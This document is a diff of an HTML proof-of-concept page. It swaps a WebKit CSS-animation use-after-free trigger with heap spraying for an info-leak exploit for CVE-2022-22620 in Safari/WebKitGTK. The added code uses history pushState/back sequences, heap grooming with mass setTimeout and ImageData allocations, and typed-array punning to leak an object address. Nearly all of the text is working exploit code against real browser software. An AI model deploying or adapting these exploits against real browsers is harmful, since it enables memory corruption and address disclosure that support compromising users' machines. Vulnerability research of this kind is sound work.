@@ -1,97 +1,82 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BUG ---- </title>
-    <style>
-      @keyframes keyframes {}
-      cite { animation: keyframes 100ms; }
-      button {
-        margin-top: 20px;
-        padding: 10px;
-        font-size: 16px;
-      }
-      #status {
-        margin-top: 10px;
-        font-weight: bold;
-      }
-    </style>
-</head>
-<body>
-    <h1>WebKit CSS Animation UAF</h1>
-    <p>Click the button to trigger the PoC. (Browser may crash or show exploit messages)</p>
-    <button id="button">Trigger PoC</button>
-    <div id="status">Waiting...</div>
-    <object type="image/png">
-        <cite></cite>
-        <dl hidden></dl>
-    </object>
-    <p>PASS if this test doesn't crash</p>
-    <script type="module">
-        import { debug_log } from './module/utils.mjs';
+<html>
 
-        const object = document.querySelector("object");
-        const cite = document.querySelector("cite");
-        const dl = document.querySelector("dl");
-        const status = document.getElementById("status");
-        const DELAY = 100;
-        let attemptCount = 0;
+<script>
+x = [1.1];
 
-        function heapSpray() {
-          let spray = [];
-          for (let i = 0; i < 10000; i++) {
-            let arr = new Uint8Array(0x1000);
-            for (let j = 0; j < arr.length; j++) {
-              arr[j] = 0x41;
-            }
-            spray.push(arr);
-          }
-          return spray;
-        }
 
-        function triggerUAF() {
-          attemptCount++;
-          debug_log("Attempt #" + attemptCount + ": Initiating exploit...");
-          status.textContent = "Attempt #" + attemptCount + " in progress...";
-          object.data = "x";
-          cite.style.animationIterationCount = "infinite";
-          setTimeout(() => {
-            const animation = cite.getAnimations()[0];
-            object.width = "1em";
-            object.codeBase;
-            animation.effect = new KeyframeEffect(dl, {});
-            const spray = heapSpray();
-            // Check for UAF after heap spray
-            debug_log("Checking for UAF memory reuse...");
-            for (let i = 0; i < spray.length; i++) {
-              const arr = spray[i];
-              if (arr[0] !== 0x41) {
-                debug_log(`UAF detected at spray index: ${i}`);
-                status.textContent = "UAF detected!";
-                return;
-              }
-            }
-            debug_log("UAF triggered, check for crash or memory corruption.");
-            status.textContent = "Exploit triggered!";
-          }, DELAY);
-        }
+var buffer      = new ArrayBuffer(8);
+var byteView    = new Uint8Array(buffer);
+var uint32View  = new Uint32Array(buffer);
+var float64View = new Float64Array(buffer);
 
-        const observer = new MutationObserver((mutations) => {
-          debug_log("DOM tree modified, attempting UAF exploit...");
-          triggerUAF();
+
+function myfunc3(leaked,b,c,d,e,f,g,h,i,j,k,l)
+{
+if( leaked!=x) {
+
+float64View[0] = leaked;
+
+alert("Leaked object: 0x"+ (uint32View[1]|0x20000).toString(16)  + (uint32View[0]>>8).toString(16) );
+
+}
+//console.log(arguments);
+}                
+
+function myfunc(a,b,c,d,e,f,g,h,i,j,k,l)
+{
+}        
+
+
+
+function test_poc_safari()
+    {
+
+        window.addEventListener('popstate', (event) => { 
+
+        event = null;
+        for(i=0; i<15750; i++) setTimeout(myfunc3,15000,x,0x61,2,3,4,5,6,7,8,9,10,11);
+        setInterval( ()=> {         for(i=0; i<200750; i++) new ImageData(1,96/4);         } , 1500);                                // trigger PopStateEvent::~PopStateEvent and dec the refcount         
         });
 
-        observer.observe(object, { attributes: true, childList: true, subtree: true });
 
-        document.getElementById('button').addEventListener('click', () => {
-            try {
-                triggerUAF();
-            } catch (e) {
-                debug_log("Error occurred: " + e.message);
-                status.textContent = "Error: Exploit failed.";
-            }
-        });
-    </script>
-</body>
-</html>
+                input = document.body.appendChild(document.createElement("input"));
+
+                                foo = document.body.appendChild(document.createElement("a"));
+                                foo.id = "foo";
+
+                                for(i=0; i<1000; i++)        setTimeout(myfunc,0,0x61,0x61,0,4,5,6,7,8,9,10,11,12);
+
+                                history.pushState("", "", location + "#foo");
+                                for(i=0; i<1000; i++)        setTimeout(myfunc,0,0x61,0x61,0,4,5,6,7,8,9,10,11,12);
+                                //Current state = state2
+
+                                history.pushState("", "");
+
+                                setTimeout(() => {
+
+                                                // Set the focus on the input element.
+                                                // During the call to back() the focus will change to the foo element 
+                                                // and therefore triggering the blur event on the input element
+                                                input.focus(); 
+
+                                                input.onblur = () => {history.replaceState("", "");  
+
+                                                 }
+                                                setTimeout(() => { history.back();   }, 500);                }, 500);
+
+
+        }
+     </script>
+    <head>
+     </head>
+     <body>
+        <h1>CVE-2022-22620: Use-after-free in Safari</h1>
+        <h1>info leak exploit: Tested on webkitgtk-2.34.3 (UBUNTU64) </h1>
+
+        <h1>Based on Google Project Zero <a href=https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22620.html> POC</a></h1>
+        <center><button onclick="test_poc_safari();"> Test CVE-2022-22620 </button></center>
+     </body>
+
+
+   </html>
